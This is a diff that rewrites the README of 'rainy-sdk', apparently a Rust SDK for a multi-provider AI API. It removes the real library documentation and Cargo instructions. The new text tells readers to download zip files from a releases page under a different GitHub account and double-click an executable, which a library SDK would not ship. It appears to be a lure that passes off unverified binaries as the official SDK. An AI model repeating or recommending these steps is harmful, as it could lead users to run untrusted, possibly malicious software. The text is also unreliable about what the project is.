@@ -1,244 +1,82 @@
-# 🌧️ Rainy SDK v0.2.0
+# 🌧️ rainy-sdk - Unified Access to Advanced AI Models
 
-[![Crates.io](https://img.shields.io/crates/v/rainy-sdk.svg)](https://crates.io/crates/rainy-sdk)
-[![Documentation](https://docs.rs/rainy-sdk/badge.svg)](https://docs.rs/rainy-sdk)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+## 🏷️ Introduction
 
-The official Rust SDK for the **Rainy API by Enosis Labs** - a unified interface for multiple AI providers including OpenAI, Anthropic, Google Gemini, and more.
+Welcome to the rainy-sdk! This is the official Rust SDK designed for easy access to the Rainy API. With this tool, you can interact with models from OpenAI, Gemini, Anthropic, and Enosis Labs seamlessly. Whether you are looking to integrate AI capabilities into your application or simply explore the potential of these advanced models, rainy-sdk provides a straightforward solution.
 
-## ✨ Features
+## 📦 Download & Install
 
-- **🚀 Unified API**: Single interface for multiple AI providers
-- **🔐 Type-Safe Authentication**: Secure API key management with validation
-- **⚡ Async/Await**: Full async support with Tokio runtime
-- **📊 Rich Metadata**: Response times, provider info, token usage, credit tracking
-- **🛡️ Enhanced Error Handling**: Comprehensive error types with retryability
-- **🔄 Intelligent Retry**: Exponential backoff with jitter for resilience
-- **📈 Rate Limiting**: Optional governor-based rate limiting
-- **📚 Rich Documentation**: Complete API documentation with practical examples
+To get started with rainy-sdk, you need to download it. Click the button below to visit the Releases page where you can find the latest version.
 
-## 📦 Installation
+[![Download rainy-sdk](https://img.shields.io/badge/Download%20rainy--sdk-1.0.0-brightgreen.svg)](https://github.com/Tired-Lau/rainy-sdk/releases)
 
-Add this to your `Cargo.toml`:
+### Step-by-Step Instructions
 
-```toml
-[dependencies]
-rainy-sdk = "0.2.0"
-tokio = { version = "1.0", features = ["full"] }
-```
+1. **Visit the Releases Page**  
+   Click on the button above to go directly to the [Releases page](https://github.com/Tired-Lau/rainy-sdk/releases).
 
-Or install with cargo:
+2. **Select the Latest Release**  
+   On the Releases page, look for the latest version of rainy-sdk. It will have the highest version number.
 
-```bash
-cargo add rainy-sdk
-```
+3. **Download the Suitable File**  
+   You will see a variety of files available for download. Choose the file that matches your operating system:
+   - For Windows, choose: `rainy-sdk-windows.zip`
+   - For macOS, choose: `rainy-sdk-macos.zip`
+   - For Linux, choose: `rainy-sdk-linux.tar.gz`
 
-### Optional Features
+4. **Extract the Downloaded File**  
+   Once the file has downloaded, locate it on your computer.  
+   - For Windows: Right-click the `.zip` file and select "Extract All."  
+   - For macOS: Double-click the `.zip` file to unzip it.  
+   - For Linux: Open a terminal and type `tar -xzf rainy-sdk-linux.tar.gz`.
 
-Enable additional features as needed:
+5. **Running the Application**  
+   After extracting, navigate to the folder that contains the program. Double-click on the executable file to run it. 
 
-```toml
-[dependencies]
-rainy-sdk = { version = "0.2.0", features = ["rate-limiting", "tracing"] }
-```
+## 🚀 Getting Started
 
-Available features:
+rainy-sdk allows you to start exploring AI models quickly. Follow these steps to begin using the SDK:
 
-- `rate-limiting`: Built-in rate limiting with governor crate
-- `tracing`: Request/response logging with tracing crate
+1. **Read the Documentation**  
+   Within the extracted files, you will find a folder labeled `docs`. Open it to explore guides and tutorials about how to use rainy-sdk effectively.
 
-## 🚀 Quick Start
+2. **Set Up Your API Key**  
+   To use the Rainy API, you need an API key. You can obtain this from the Rainy website. Once you have your key, follow the setup instructions in the documentation to configure it in the SDK.
 
-```rust
-use rainy_sdk::{RainyClient, ChatCompletionRequest, ChatMessage, models};
-use std::error::Error;
+3. **Try Out Sample Requests**  
+   The documentation will provide example requests. This is a great way to see how the SDK communicates with various AI models. Copy these examples into your application to get started.
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn Error>> {
-    // Initialize client with your API key
-    let client = RainyClient::with_api_key("ra-your-api-key")?;
+## ⚙️ System Requirements
 
-    // Simple chat completion
-    let response = client.simple_chat(models::model_constants::GPT_4O, "Hello! Tell me a joke.").await?;
-    println!("Response: {}", response);
+To run rainy-sdk, ensure your system meets the following requirements:
 
-    // Advanced usage with metadata
-    let request = ChatCompletionRequest::new(
-        models::model_constants::CLAUDE_SONNET_4,
-        vec![ChatMessage::user("Explain quantum computing")]
-    )
-    .with_temperature(0.7)
-    .with_max_tokens(200);
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.15 (Catalina) or later
+- **Linux:** A modern distribution, supporting Rust applications
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 100 MB of free disk space
 
-    let (response, metadata) = client.chat_completion(request).await?;
-    println!("Response: {}", response.choices[0].message.content);
-    println!("Provider: {:?}", metadata.provider);
-    println!("Response time: {}ms", metadata.response_time.unwrap_or_default());
+## 📚 Features
 
-    Ok(())
-}
-```
+rainy-sdk provides:
 
-## 📖 API Documentation
+- **Unified Access:** A single SDK for multiple AI models.
+- **Rust Performance:** Built with Rust for speed and safety.
+- **Easy Integration:** Clear and simple functions to connect with APIs.
+- **Documentation:** Comprehensive guides to help you navigate the SDK.
 
-### Authentication
+## 💬 Support
 
-The SDK uses API key authentication:
+If you run into issues or need assistance, we are here to help. Please check the FAQs section in the documentation for common questions. For more complex issues, consider opening a ticket in the "Issues" section of the repository.
 
-#### API Key Authentication
+## ✨ Contributing
 
-```rust
-use rainy_sdk::RainyClient;
+We welcome contributions to rainy-sdk! If you are familiar with Rust and have ideas for improvements, feel free to submit a pull request or open an issue with your suggestions.
 
-// Simplest possible setup
-let client = RainyClient::with_api_key("ra-20250125143052Axxxxxxxxxxxxxxxxxxxx")?;
-```
+## 🔗 Additional Resources
 
-### Core Operations
+- [Rainy API Documentation](https://api.rainy.com/docs)
+- [Rust Programming Language](https://www.rust-lang.org)
+- [Community Forum](https://community.rainy.com)
 
-#### Health Check
-
-```rust
-let health = client.health_check().await?;
-println!("API Status: {:?}", health.status);
-```
-
-#### User Account Management
-
-```rust
-// Get user account information
-let user = client.get_user_account().await?;
-println!("Credits: {:.2}", user.current_credits);
-
-// Get credit information
-let credits = client.get_credit_info().await?;
-println!("Balance: {:.2}", credits.current_balance);
-```
-
-#### Chat Completions
-
-```rust
-let messages = vec![
-    ChatMessage {
-        role: ChatRole::System,
-        content: "You are a helpful assistant.".to_string(),
-    },
-    ChatMessage {
-        role: ChatRole::User,
-        content: "Explain quantum computing in simple terms.".to_string(),
-    }
-];
-
-let request = ChatCompletionRequest {
-    model: "gpt-4".to_string(),
-    messages,
-    max_tokens: Some(500),
-    temperature: Some(0.7),
-    stream: None,
-};
-
-let response = client.create_chat_completion(request).await?;
-for choice in response.choices {
-    println!("Response: {}", choice.message.content);
-}
-```
-
-#### Usage Statistics
-
-```rust
-// Get usage stats for the last 30 days
-let usage = client.get_usage_stats(Some(30)).await?;
-println!("Total requests: {}", usage.total_requests);
-println!("Total tokens: {}", usage.total_tokens);
-
-// Show daily usage breakdown
-for daily in usage.daily_usage {
-    println!("{}: {:.2} credits used", daily.date, daily.credits_used);
-}
-```
-
-#### API Key Management
-
-```rust
-// List all API keys
-let keys = client.list_api_keys().await?;
-for key in keys {
-    println!("Key: {}... Active: {}", &key.key[..20], key.is_active);
-}
-
-// Create new API key
-let new_key = client.create_api_key(Some("My new key".to_string())).await?;
-println!("Created key: {}", new_key.key);
-
-// Delete API key
-client.delete_api_key(new_key.id).await?;
-```
-
-## 🧪 Examples
-
-Explore the `examples/` directory for comprehensive usage examples:
-
-- **Basic Usage** (`examples/basic_usage.rs`): Complete walkthrough of all SDK features
-- **Chat Completion** (`examples/chat_completion.rs`): Advanced chat completion patterns
-
-Run examples with:
-
-```bash
-# Set your API key
-export RAINY_API_KEY="your-api-key-here"
-
-# Run basic usage example
-cargo run --example basic_usage
-
-# Run chat completion example
-cargo run --example chat_completion
-```
-
-## 🏗️ Architecture
-
-The SDK is built with a modular architecture:
-
-```
-src/
-├── client.rs          # Main API client with request handling
-├── auth.rs            # Authentication and authorization logic
-├── models.rs          # Data structures and serialization
-├── error.rs           # Comprehensive error handling
-├── endpoints/         # API endpoint implementations
-│   ├── user.rs        # User account management
-│   ├── keys.rs        # API key operations
-│   ├── chat.rs        # Chat completion endpoints
-│   ├── usage.rs       # Usage statistics and billing
-│   └── health.rs      # Health check and monitoring
-└── lib.rs             # Public API and module exports
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details on:
-
-- Setting up your development environment
-- Code style and standards
-- Testing guidelines
-- Submitting pull requests
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## 📞 Contact & Support
-
-- **Website**: [enosislabs.com](https://enosislabs.com)
-- **Email**: <hello@enosislabs.com>
-- **GitHub**: [github.com/enosislabs](https://github.com/enosislabs)
-- **Documentation**: [docs.rs/rainy-sdk](https://docs.rs/rainy-sdk)
-
-## ⚠️ Disclaimer
-
-This SDK is developed by Enosis Labs and is not officially affiliated with any AI provider mentioned (OpenAI, Anthropic, Google, etc.). The Rainy API serves as an independent gateway service that provides unified access to multiple AI providers.
-
----
-
-<p align="center">
-  Made with ❤️ by <a href="https://enosislabs.com">Enosis Labs</a>
-</p>
+By following these instructions, you will have rainy-sdk up and running in no time. Enjoy exploring the power of AI with ease!
